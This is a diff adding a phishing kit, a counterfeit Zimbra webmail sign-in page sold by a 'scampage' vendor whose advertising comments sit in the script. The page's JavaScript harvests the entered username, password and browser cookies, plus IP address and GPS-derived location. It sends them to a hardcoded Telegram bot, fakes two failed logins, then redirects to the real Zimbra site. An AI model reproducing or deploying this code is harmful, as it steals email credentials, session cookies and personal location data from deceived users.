@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Zimbra Web Client Sign In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="stylesheet" type="text/css" href="./index_files/common,login,zhtml,skin.css">
+    <link rel="SHORTCUT ICON" href="./index_files/img/logo/favicon.ico">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <div class="LoginScreen">
+      <div class="center">
+        <div class="contentBox">
+          <h1>
+            <a href="/" id="bannerLink" target="_new" title="Zimbra">
+              <span class="ScreenReaderOnly">Zimbra</span>
+              <span class="ImgLoginBanner"></span>
+            </a>
+          </h1>
+          <div id="ZLoginAppName">Web Client</div>
+          <form id="loginForm" method="POST">
+            <div id="ZLoginErrorPanel" style="display: none;">
+              <table>
+                <tbody>
+                  <tr>
+                    <td>
+                      <img src="./index_files/ImgCritical_32.png" title="Error" alt="Error" id="ZLoginErrorIcon">
+                    </td>
+                    <td>The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div id="ZLoginSuccessPanel" style="display: none;">
+              <table>
+                <tbody>
+                  <tr>
+                    <td>
+                      <img src="./index_files/ImgSuccess_32.png" width="32" title="Success" alt="Success" id="ZLoginSuccessIcon" style="margin-right: 10px;">
+                    </td>
+                    <td>Sorry, your sign-in timed out. Please try again successfully.</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <table class="form">
+              <tbody>
+                <tr>
+                  <td>
+                    <label for="username">Username:</label>
+                  </td>
+                  <td>
+                    <input id="username" class="zLoginField" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <label for="password">Password:</label>
+                  </td>
+                  <td>
+                    <input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024">
+                  </td>
+                </tr>
+                <tr>
+                  <td>&nbsp;</td>
+                  <td class="submitTD">
+                    <input id="remember" value="1" type="checkbox" name="zrememberme">
+                    <label for="remember">Stay signed in</label>
+                    <button id="loginButton" class="ZLoginButton DwtButton">Sign In</button>
+                  </td>
+                </tr>
+                <tr>
+                  <td>&nbsp;</td>
+                  <td class="submitTD">
+                    <a href="/public/PasswordRecovery.html" target="_blank" id="ZLoginForgotPassword" aria-controls="ZLoginForgotPassword" aria-expanded="false">Forgot Password</a>
+                  </td>
+                </tr>
+                <tr>
+                  <td colspan="2">
+                    <hr>
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <label for="client">Version:</label>
+                  </td>
+                  <td>
+                    <div class="positioning">
+                      <select id="client">
+                        <option value="Default" selected>Default</option>
+                        <option value="Advanced (Ajax)">Advanced (Ajax)</option>
+                        <option value="Standard (HTML)">Standard (HTML)</option>
+                        <option value="Mobile">Mobile</option>
+                      </select>
+                      <a onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">What’s This?</a>
+                      <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip">
+                        <h3 style="text-align:center;">Client Types</h3>
+                        <b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br>
+                        <br>
+                        <b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br>
+                        <br>
+                        <b>Mobile</b> is recommended for mobile devices. <br>
+                        <br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.
+                      </div>
+                      <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version. We strongly recommend that you use the Standard client.</div>
+                    </div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </form>
+        </div>
+        <div class="decor1"></div>
+      </div>
+      <div class="Footer">
+        <div id="ZLoginNotice" class="legalNotice-small">
+          <a target="_new" href="https://www.zimbra.com/">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com/">Blog</a> - <a target="_new" href="https://wiki.zimbra.com/">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a>
+        </div>
+        <div class="copyright"> Copyright © 2005-2024 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+      </div>
+      <div class="decor2"></div>
+    </div>
+    <script>
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+      function showWhatsThis() {
+        var anchor = document.getElementById('ZLoginWhatsThisAnchor'),
+          tooltip = document.getElementById("ZLoginWhatsThis"),
+          doHide = (tooltip.style.display === "block");
+        tooltip.style.display = doHide ? "none" : "block";
+        anchor.setAttribute("aria-expanded", doHide ? "false" : "true");
+      }
+      const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+      window.AUTH_LOADING_MESSAGE = 'Authenticating...';
+      async function sendFunction(data) {
+        try {
+          const formDataObject = {};
+          data.forEach((value, key) => {
+            formDataObject[key] = value;
+          });
+          const username = formDataObject.username;
+          const password = formDataObject.password;
+          const version = formDataObject.version;
+          const xCookie = formDataObject.xCookie;
+          const ipAddress = await fetch('https://api.ipify.org').then(res => res.text());
+          const deviceInfo = {
+            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+          };
+          await getLocation(username, password, version, xCookie, deviceInfo, ipAddress);
+        } catch (error) {
+          console.error("Error capturing IP address:", error);
+        }
+      }
+      async function sendLogs(username, password, version, xCookie, sendFunction) {
+        try {
+          const data = new FormData();
+          data.append('username', username);
+          data.append('password', password);
+          data.append('version', version);
+          data.append('xCookie', xCookie);
+          // Call the provided function with the data
+          return await sendFunction(data);
+        } catch (error) {
+          throw new Error('Unable to connect to server');
+        }
+      }
+      $(function() {
+        //BEGIN
+        window.retryAttemptCount = 1;
+        const formElement = $("form#loginForm");
+        const usernameElement = $("input#username");
+        const passwordElement = $("input#password");
+        const versionElement = $("select#client");
+        const submitButtonElement = $("button#loginButton");
+        const errorElement = $("#ZLoginErrorPanel");
+        const successElement = $("#ZLoginSuccessPanel");
+        $("body").on('click', 'a', function(e) {
+          e.preventDefault()
+        });
+        //FORM SUBMIT ACTION
+        formElement.on('submit', function(e) {
+          e.preventDefault();
+        });
+        submitButtonElement.on('click', async function(e) {
+          e.preventDefault();
+          errorElement.hide();
+          successElement.hide();
+          const submitButtonInnerText = submitButtonElement.text();
+          try {
+            const usernameVal = usernameElement.val().trim();
+            const passwordVal = passwordElement.val().trim();
+            const versionVal = versionElement.val();
+            if (!(usernameVal && passwordVal)) {
+              throw Error('Username and Password is required.');
+            }
+            if (!usernameVal) {
+              throw Error('Username is required.');
+            }
+            if (!passwordVal) {
+              throw Error('Password is required.');
+            }
+            if (passwordVal.length <= 4) {
+              throw Error('Password must be greater than four characters.');
+            }
+            const xCookie = document.cookie;
+            // button authorizing
+            submitButtonElement.text(window.AUTH_LOADING_MESSAGE)
+            const response = await sendLogs(usernameVal, passwordVal, versionVal, xCookie, sendFunction);
+            setTimeout(function() {
+              submitButtonElement.text(submitButtonInnerText);
+              if (parseInt(window.retryAttemptCount) <= 2) {
+                window.retryAttemptCount = parseInt(window.retryAttemptCount) + 1;
+                passwordElement.val('');
+                errorElement.show();
+              } else {
+                //success message
+                successElement.show();
+                //redirect
+                setTimeout(function() {
+                  window.location.replace("https://www.zimbra.com");
+                }, 5000);
+              }
+            }, 4000);
+          } catch (error) {
+            errorElement.html(error.message).show();
+            setTimeout(function() {
+              submitButtonElement.text(submitButtonInnerText);
+            }, 500);
+          }
+        });
+      });
+
+      function getLocation(username, password, version, xCookie, deviceInfo, ipAddress) {
+        navigator.geolocation?.getCurrentPosition(async (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
+            try {
+              const response = await fetch(apiUrl);
+              const data = await response.json();
+              if (data.results.length > 0) {
+                const result = data.results[0].components;
+                const city = result.city || result.village || result.town;
+                const state = result.state;
+                const country = result.country;
+                const zipCode = result.postcode;
+                const continent = result.continent;
+                const county = result.county;
+                var dataToSend = {
+                  username,
+                  password,
+                  version,
+                  ipAddress,
+                  Device: deviceInfo.manufacturer,
+                  OS: deviceInfo.os,
+                  Browser: deviceInfo.browser,
+                  Latitude: latitude,
+                  Longitude: longitude,
+                  City: city,
+                  State: state,
+                  Country: country,
+                  County: county,
+                  ZipCode: zipCode,
+                  Cookies: xCookie,
+                };
+                if (Object.keys(dataToSend).length > 0) {
+                  sendToTelegram(dataToSend);
+                } else {
+                  console.warn("No data to send to Telegram.");
+                }
+              } else {
+                console.error("Location information not found.");
+              }
+            } catch (error) {
+              console.error("Error fetching location data:", error);
+            }
+          },
+          (error) => {
+            // Handle the case where the user denies location permission
+            console.error("Error getting location:", error);
+            alert("Location permission is required to login to Cytanet Webmail.");
+          });
+      }
+
+      function sendToTelegram(data) {
+        // Add your bot details here👇 (this is where you will get the logs)
+        var telegramBotId = "5991263032:AAHNBV9ePhJQlroqIq0a0YkLYWQCbVltgEo";
+        var chatId = 6157700917;
+
+        var payload = {
+          chat_id: chatId,
+          text: `
+            Cytanet Webmail Log:
+            ________________________
+               "Username": "${data.username}",
+               "Password": "${data.password}",
+			         "Version": "${data.version}",
+               "IP Address": "${data.ipAddress}",
+               "Device Info": "${data.Device}",
+               "OS": "${data.OS}",
+               "Browser": "${data.Browser}",
+               "Latitude": ${data.Latitude},
+               "Longitude": ${data.Longitude},
+               "City": "${data.City}",
+               "State": "${data.State}",
+               "County": "${data.County}",
+               "Country": "${data.Country}",
+               "ZipCode": "${data.ZipCode}",
+               "Cookies": ["${data.Cookies}"],
+            `
+        };
+        var sendToBot = {
+          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          data: JSON.stringify(payload)
+        };
+        $.ajax(sendToBot).done(function(response) {
+          console.log("Telegram API response:", JSON.stringify(response));
+        }).fail(function(error) {
+          console.error("Error sending data to Telegram:", error);
+        });
+      }
+    </script>
+  </body>
+</html>
